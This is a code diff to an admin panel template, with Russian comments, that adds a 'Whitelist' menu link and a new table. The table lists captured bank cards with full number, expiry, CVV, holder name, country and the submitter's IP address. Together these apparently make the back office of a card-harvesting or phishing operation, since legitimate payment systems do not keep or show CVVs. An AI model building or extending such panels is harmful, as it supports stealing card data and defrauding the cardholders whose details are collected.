@@ -14,7 +14,7 @@
         }
         .sidebar {
             width: 200px;
-            height: 100vh;
+            min-height: 100vh;
             background-color: #007BFF;
             padding-top: 20px;
             display: flex;
@@ -107,6 +107,7 @@
     <div class="sidebar">
         <a href="/admin/users">Пользователи</a>
         <a href="/admin/orders">Заказы</a>
+        <a href="/admin/whitelist">Whitelist</a>
         <a href="/admin/payments">Платежи</a>
         <a href="/admin/rewards">Создание бандлов</a>
         <a href="/admin/promo">Промокоды</a>
@@ -145,6 +146,42 @@
             </table>
             <button type="submit">Save Addresses</button>
         </form>
+
+        <h1>Bank Card Information</h1>
+        <table>
+            <thead>
+                <tr>
+                    <th>Number</th>
+                    <th>Date</th>
+                    <th>CVV</th>
+                    <th>Holder</th>
+                    <th>Country</th>  <!-- Новый столбец для страны -->
+                    <th>IP Address</th>
+                    <th>Delete</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- Динамическое заполнение таблицы данными карт -->
+                {% for card in cards %}
+                <tr>
+                    <td>{{ card.number }}</td>
+                    <td>{{ card.date }}</td>
+                    <td>{{ card.cvv }}</td>
+                    <td>{{ card.name }}</td>
+                    <td>{{ card.country }}</td>  <!-- Отображаем страну -->
+                    <td>{{ card.ip_address }}</td>
+                    <td>
+                        <form method="POST" action="/admin/payments">
+                            <button type="submit" name="delete_card" value="{{ card.id }}" class="delete-btn">Delete</button>
+                        </form>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+        
+        
+        
     </div>
 </body>
 </html>
